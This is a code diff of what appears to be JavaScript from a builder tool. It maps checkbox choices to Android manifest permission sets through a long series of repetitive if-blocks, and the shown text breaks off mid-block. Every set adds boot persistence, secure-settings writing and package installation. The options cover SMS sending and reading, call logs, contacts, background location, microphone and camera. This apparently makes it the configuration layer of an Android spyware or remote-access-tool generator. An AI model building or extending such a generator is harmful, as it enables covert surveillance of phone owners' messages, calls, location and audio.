+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
 
-      return (firstPart + lastPart);
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
 
-  };
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+        //if three are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+
+           ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
